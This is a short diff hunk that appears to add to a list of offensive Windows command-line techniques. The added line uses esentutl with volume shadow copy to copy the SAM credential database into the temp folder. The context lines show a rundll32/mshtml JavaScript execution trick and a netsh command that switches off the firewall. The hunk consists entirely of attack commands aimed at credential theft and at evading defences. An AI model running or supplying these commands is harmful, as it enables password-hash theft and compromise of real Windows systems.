@@ -247,6 +247,9 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObj
  netsh advfirewall set currentprofile state off
 
 
+******************
+
+esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
 
 
 
